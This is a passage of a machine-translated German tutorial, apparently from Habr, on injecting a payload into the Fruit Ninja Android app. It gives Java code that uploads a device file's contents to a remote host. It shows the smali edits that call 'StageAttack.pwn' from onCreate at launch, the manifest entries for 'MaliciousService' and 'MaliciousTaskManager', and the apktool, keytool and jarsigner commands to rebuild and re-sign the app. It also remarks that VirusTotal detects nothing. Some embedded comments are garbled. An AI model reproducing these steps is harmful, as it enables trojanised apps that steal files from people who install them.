class="hljs-function"><span class="hljs-params">(String path)</span></span></span><span class="hljs-function"> </span></span>{ File file = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(path); URL url = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> URL(<span class="hljs-string"><span class="hljs-string">"http://xxxxxxxxxx"</span></span>); HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection(); urlConnection.setConnectTimeout(<span class="hljs-number"><span class="hljs-number">30</span></span> * <span class="hljs-number"><span class="hljs-number">1000</span></span>); urlConnection.setRequestMethod(<span class="hljs-string"><span class="hljs-string">"POST"</span></span>); urlConnection.setDoOutput(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); urlConnection.setRequestProperty(<span class="hljs-string"><span class="hljs-string">"Content-Type"</span></span>, <span class="hljs-string"><span class="hljs-string">"application/octet-stream"</span></span>); DataOutputStream request = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> DataOutputStream(urlConnection.getOutputStream()); request.write(readFileToByteArray(file)); request.flush(); request.close(); <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> respCode = urlConnection.getResponseCode(); Log.d(TAG, <span class="hljs-string"><span class="hljs-string">"Return status code: "</span></span> + respCode); }</code> </pre> <br><h2 id="vnedryaem-payload">  Wir f√ºhren Nutzlast ein </h2><br><p>  Zuerst dekompilieren wir Fruit Ninja mit <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">apktool</a> .  Wir dekompilieren die Anwendung nicht vor Java-Code, da wir sie nach der √Ñnderung nicht wieder zusammensetzen k√∂nnen.  Wir m√ºssen genau kleine Klassen bekommen.  Und wir werden unseren Code auch in Form von Smali-Code implementieren. </p><br>  Was ist Smali-Code? <br>  Android-Anwendungen werden in Bytecode kompiliert, der von der virtuellen Dalvik-Maschine ausgef√ºhrt wird.  Der Bytecode selbst ist schwer zu lesen, daher hei√üt seine f√ºr Menschen lesbare Form smali.  Smali ist ein Analogon der Assemblersprache, aber f√ºr Android. <br><br><p>  Wenn unsere Nutzdaten beim Start der Anwendung gestartet werden sollen, m√ºssen wir den Einstiegspunkt √§ndern.  Der Einstiegspunkt f√ºr eine Anwendungs-GUI ist eine untergeordnete Activity-Klasse, die ACTION_MAIN verwendet.  √ñffnen Sie den Ordner mit der dekompilierten Anwendung und suchen Sie ihn in der Datei AndroidManifest.xml: </p><br><pre> <code class="java hljs">&lt;activity android:name=<span class="hljs-string"><span class="hljs-string">"com.halfbrick.mortar.MortarGameLauncherActivity"</span></span>&gt; &lt;intent-filter&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.action.MAIN"</span></span>/&gt; &lt;category android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.category.LAUNCHER"</span></span>/&gt; &lt;/intent-filter&gt; &lt;/activity&gt;</code> </pre> <br><p>  Wir haben die <code>com.halfbrick.mortar.MortarGameLauncherActivity</code> uns <code>com.halfbrick.mortar.MortarGameLauncherActivity</code> Klasse <code>com.halfbrick.mortar.MortarGameLauncherActivity</code> gefunden.  Bevor Sie es studieren, schauen wir uns den Lebenszyklus der Aktivit√§t an. Dies wird uns n√ºtzlich sein. </p><br><p><img src="https://habrastorage.org/webt/tz/nc/cz/tzncczehraigp6fvglv6dd5qfik.png" alt="Bild"></p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Quelle</a> </p><br><p>  Offene Aktivit√§t, f√ºr mich liegt sie entlang der <em>Pfadbasis \ smali_classes2 \ com \ halfbrick \ mortar \ MortarGameLauncherActivity.smali</em> .  Wenn Sie noch keinen Smali-Code gesehen haben, ist dies nicht be√§ngstigend. Es ist einfach genug zu <strong>lesen</strong> und logisch zu l√∂schen. </p><br><pre> <code class="java hljs">.class <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> Lcom/halfbrick/mortar/MortarGameLauncherActivity; <span class="hljs-comment"><span class="hljs-comment">//     package .super Landroid/app/Activity; //.super     . // Activity    android.app.Activity. .source "MortarGameLauncherActivity.java" //  Java . .method public constructor &lt;init&gt;()V /*       -   .   ,    .   , V - void */ .locals 0 /*   Dalvik   ,    .    ,      .       .    ,     16, 256  64.       ,  .       .    ,    . .locals 0 - ,    0  .    ,  v0, v1, v2, v3, ...    - p0, p1, p2, p3. */ .line 28 invoke-direct {p0}, Landroid/app/Activity;-&gt;&lt;init&gt;()V /* invoke-     . invoke-direct -   ,   . ,     java - private  .    ,       ,   .      . p0 -    this  java. init   ,     . */ return-void //    .end method .method protected onStart()V .locals 2 .line 33 invoke-super {p0}, Landroid/app/Activity;-&gt;onStart()V //  onStart()   .line 35 invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;-&gt;isTaskRoot()Z /* invoke-virtual -   .     ,     static, private, final  .  MortarGameLauncherActivity    isTaskRoot(),        Activity.   Z - boolean */ move-result v0 /*    isTaskRoot()   v0. isTaskRoot()  true,   Activity  ,      */ if-nez v0, :cond_0 /*  v0 = true,     cond_0 ( goto).  v0 = false,   */ .line 37 invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;-&gt;finish()V // finish()  Activity return-void //    .line 41 :cond_0 new-instance v0, Landroid/content/Intent; //   Intent        v0 const-class v1, Lcom/halfbrick/mortar/MortarGameActivity; //    MortarGameActivity   v1. MortarGameActivity    Activity. invoke-direct {v0, p0, v1}, Landroid/content/Intent;-&gt;&lt;init&gt;(Landroid/content/Context;Ljava/lang/Class;)V //    Intent,  ,    .line 42 invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;-&gt;finish()V //   Activity .line 43 invoke-virtual {p0, v0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;-&gt;startActivity(Landroid/content/Intent;)V //  MortarGameActivity return-void .end method</span></span></code> </pre> <br><p>  Wir haben herausgefunden, dass <code>MortarGameLauncherActivity</code> startet und schlie√üt.  √ñffnen Sie <code>MortarGameActivity</code> .  Wir werden es nicht vollst√§ndig kommentieren.  Wir sind daran interessiert, was in der <code>Oncreate</code> Methode passiert, da sie die Erstellung von Aktivit√§ten startet.  Unmittelbar danach werden wir unseren Code einf√ºgen.  Es ist wichtig, die Linie beim Einf√ºgen nicht zu st√∂ren. </p><br><pre> <code class="java hljs">.<span class="hljs-function"><span class="hljs-function">method </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onCreate</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Landroid/os/Bundle;)</span></span></span><span class="hljs-function">V .locals 9 :try_start_0 </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">const</span></span></span><span class="hljs-function">-string v0, "android.os.AsyncTask" .line 465 invoke-</span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span></span>{v0}, Ljava/lang/Class;-&gt;forName(Ljava/lang/String;)Ljava/lang/Class; :try_end_0 .<span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0 .line <span class="hljs-number"><span class="hljs-number">471</span></span> :catch_0 invoke-<span class="hljs-keyword"><span class="hljs-keyword">super</span></span> {p0, p1}, Landroid/support/v4/app/FragmentActivity;-&gt;onCreate(Landroid/os/Bundle;)V &lt;--------------------------- <span class="hljs-comment"><span class="hljs-comment">//  ,   472 .line 473 invoke-static {}, Lcom/halfbrick/mortar/NativeGameLib;-&gt;TryLoadGameLibrary()Z .line 475 invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;-&gt;getIntent()Landroid/content/Intent; ...</span></span></code> </pre> <br><p>  Jetzt brauchen wir einen kleinen Nutzlastcode.  Wir sammeln unseren Scanner in apk und dekompilieren.  Wir √ºbertragen unsere drei dekompilierten Klassen, die entlang des Pfades <em>smali \ kz \ c \ signscan liegen</em> , in den Ordner <em>com / halfbrick / mortar</em> .  √Ñndern Sie den <em>Paketnamen in</em> alle Klassen von <em>kz.c.signscan</em> in <em>com.halfbrick.mortar</em> . </p><br><p>  Es war: </p><br><pre> <code class="java hljs">.class <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> Lkz/c/signscan/StageAttack;</code> </pre> <br><p>  Es wurde: </p><br><pre> <code class="java hljs">.class <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> Lcom/halfbrick/mortar/StageAttack;</code> </pre> <br><p>  In der smali MainActivity-Klasse verwenden <code>MainActivity</code> die Payload-Aufrufzeile: </p><br><pre> <code class="java hljs">invoke-<span class="hljs-keyword"><span class="hljs-keyword">static</span></span> {p0}, Lcom/halfbrick/mortar/StageAttack;-&gt;pwn(Landroid/content/Context;)V</code> </pre> <br><p>  Und in <code>MortarGameActivity</code> einf√ºgen.  Infolgedessen sieht die <code>onCreate()</code> -Methode folgenderma√üen aus: </p><br><pre> <code class="java hljs">... .<span class="hljs-function"><span class="hljs-function">method </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onCreate</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Landroid/os/Bundle;)</span></span></span><span class="hljs-function">V .locals 9 :try_start_0 </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">const</span></span></span><span class="hljs-function">-string v0, "android.os.AsyncTask" .line 465 invoke-</span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span></span>{v0}, Ljava/lang/Class;-&gt;forName(Ljava/lang/String;)Ljava/lang/Class; :try_end_0 .<span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0 .line <span class="hljs-number"><span class="hljs-number">471</span></span> :catch_0 invoke-<span class="hljs-keyword"><span class="hljs-keyword">super</span></span> {p0, p1}, Landroid/support/v4/app/FragmentActivity;-&gt;onCreate(Landroid/os/Bundle;)V .line <span class="hljs-number"><span class="hljs-number">472</span></span> invoke-<span class="hljs-keyword"><span class="hljs-keyword">static</span></span> {p0}, Lcom/halfbrick/mortar/StageAttack;-&gt;pwn(Landroid/content/Context;)V .line <span class="hljs-number"><span class="hljs-number">473</span></span> invoke-<span class="hljs-keyword"><span class="hljs-keyword">static</span></span> {}, Lcom/halfbrick/mortar/NativeGameLib;-&gt;TryLoadGameLibrary()Z .line <span class="hljs-number"><span class="hljs-number">475</span></span> invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;-&gt;getIntent()Landroid/content/Intent; ...</code> </pre> <br><p>  Die <code>MaliciousTaskManager</code> Klasse in Payload ist BroadcastReceiver und <code>MaliciousService</code> ist IntentService, daher m√ºssen wir sie in das Manifest schreiben. </p><br><pre> <code class="xml hljs">... <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".MaliciousTaskManager"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".MaliciousService"</span></span></span><span class="hljs-tag">/&gt;</span></span> ...</code> </pre> <br><p>  Wir packen alles mit dem <code>apktool b myfolder</code> .  Als Ergebnis erhalten wir die apk-Datei.  Jetzt m√ºssen wir es unterschreiben, damit der Android unsere Bewerbung akzeptiert.  Zuerst generieren wir einen Schl√ºssel, mit dem wir unterschreiben: </p><br><pre> <code class="plaintext hljs">keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000</code> </pre> <br><p>  Wir unterschreiben apk: </p><br><pre> <code class="plaintext hljs">jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name</code> </pre> <br><p>  Virustotal wird uns nichts zeigen, da wir nichts ‚ÄûIllegales‚Äú tun.  -     . </p><br><p><img src="https://habrastorage.org/webt/po/ht/iu/pohtiuf5xpkonifhpozoth_pgbu.png" alt="Bild"></p><br><p> ,    : </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/e5w5taMY8MA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/iBCX_A5FBVU" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><p> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="> </a> </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de460993/">https://habr.com/ru/post/de460993/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de460983/index.html">Ich bin nicht real</a></li>
<li><a href="../de460985/index.html">14 besten Kanban-Tools im Jahr 2019</a></li>
<li><a href="../de460987/index.html">"God Mode for the Internet": Verfolgung von Benutzern √ºber die Erweiterungen Chrome und Firefox</a></li>
<li><a href="../de460989/index.html">Welche Sprache - D, Go oder Rust - hat bessere Aussichten, C zu ersetzen, und warum?</a></li>
<li><a href="../de460991/index.html">Tic Tac Toe, Teil 5: C ++ Backend Boost.Beast, HTTP</a></li>
<li><a href="../de460995/index.html">Wir stellen das ML-Projekt mit Flask als REST-API bereit und machen es √ºber die Flutter-Anwendung zug√§nglich</a></li>
<li><a href="../de460997/index.html">Touristen helfen Wissenschaftlern, die Anzahl der gro√üen Raubtiere abzusch√§tzen</a></li>
<li><a href="../de460999/index.html">Lass uns ein kleines Spiel mit Lamoda spielen</a></li>
<li><a href="../de461003/index.html">Analyse: Wie der Hochfrequenzhandelsmarkt an der B√∂rse funktioniert</a></li>
<li><a href="../de461005/index.html">Testen f√ºr das Unternehmen: Stellen Sie beim Interview die richtigen Fragen</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>